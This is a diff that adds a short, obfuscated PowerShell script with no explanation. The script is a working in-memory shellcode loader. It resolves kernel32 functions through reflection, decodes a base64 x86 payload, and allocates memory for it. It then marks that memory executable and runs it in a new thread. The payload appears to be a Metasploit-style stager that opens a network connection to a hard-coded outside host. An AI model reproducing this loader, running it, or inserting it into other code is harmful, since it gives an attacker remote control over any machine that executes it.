@@ -1,0 +1,29 @@
+function xEq {
+        Param ($vvOkr, $i6e5)
+        $qk = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+
+        return $qk.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($qk.GetMethod('GetModuleHandle')).Invoke($null, @($vvOkr)))), $i6e5))
+}
+
+function lwQVj {
+        Param (
+                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $tTcf,
+                [Parameter(Position = 1)] [Type] $g3rh = [Void]
+        )
+
+        $sp = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+        $sp.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $tTcf).SetImplementationFlags('Runtime, Managed')
+        $sp.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $g3rh, $tTcf).SetImplementationFlags('Runtime, Managed')
+
+        return $sp.CreateType()
+}
+
+[Byte[]]$rw = [System.Convert]::FromBase64String("/OiPAAAAYInlMdJki1Iwi1IMi1IUi3IoMf8Pt0omMcCsPGF8Aiwgwc8NAcdJde9Si1IQV4tCPAHQi0B4hcB0TAHQi1ggAdNQi0gYhcl0PDH/SYs0iwHWMcDBzw2sAcc44HX0A334O30kdeBYi1gkAdNmiwxLi1gcAdOLBIsB0IlEJCRbW2FZWlH/4FhfWosS6YD///9daDMyAABod3MyX1RoTHcmB4no/9C4kAEAACnEVFBoKYBrAP/VagpoDTzBV2gCAAG7ieZQUFBQQFBAUGjqD9/g/9WXahBWV2iZpXRh/9WFwHQM/04Idexo8LWiVv/VagBqBFZXaALZyF//1Ys2akBoABAAAFZqAGhYpFPl/9WTU2oAVlNXaALZyF//1QHDKcZ17sM=")
+[Uint32]$sPu = 0
+$akNn = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((xEq kernel32.dll VirtualAlloc), (lwQVj @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $rw.Length,0x3000, 0x04)
+
+[System.Runtime.InteropServices.Marshal]::Copy($rw, 0, $akNn, $rw.length)
+if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((xEq kernel32.dll VirtualProtect), (lwQVj @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($akNn, [Uint32]$rw.Length, 0x10, [Ref]$sPu)) -eq $true) {
+        $jdiW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((xEq kernel32.dll CreateThread), (lwQVj @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$akNn,[IntPtr]::Zero,0,[IntPtr]::Zero)
+        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((xEq kernel32.dll WaitForSingleObject), (lwQVj @([IntPtr], [Int32]))).Invoke($jdiW,0xffffffff) | Out-Null
+}
